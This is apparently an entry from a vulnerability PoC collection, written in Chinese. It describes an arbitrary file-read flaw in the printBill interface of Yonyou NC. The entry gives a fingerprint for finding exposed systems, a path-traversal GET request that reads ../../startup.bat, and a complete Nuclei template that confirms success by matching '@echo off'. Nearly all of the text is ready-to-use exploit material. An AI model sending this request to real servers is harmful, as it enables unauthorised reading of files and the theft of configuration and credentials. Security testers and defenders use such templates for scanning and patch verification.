# 用友NCprintBill任意文件读取

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="Client/Uclient/UClient.dmg"`
- **请求**：`GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 68`

**请求体 / payload**
```
Nuclei
id: Yonyou_NC_printBill_FileRead
info:
name: Yonyou_NC_printBill_FileRead
author: HackTwo
severity: high
description: 用友NC系统printBill接口存在任意文件读取漏洞
metadata:
max-request: 1
shodan-query: ""
verified: true
http:
- raw:
- +
@timeout: 30s
GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
max-redirects: 3
matchers-condition: and
matchers:
- id: 1
type: word
part: body
words:
- '@echo off'
condition: and
```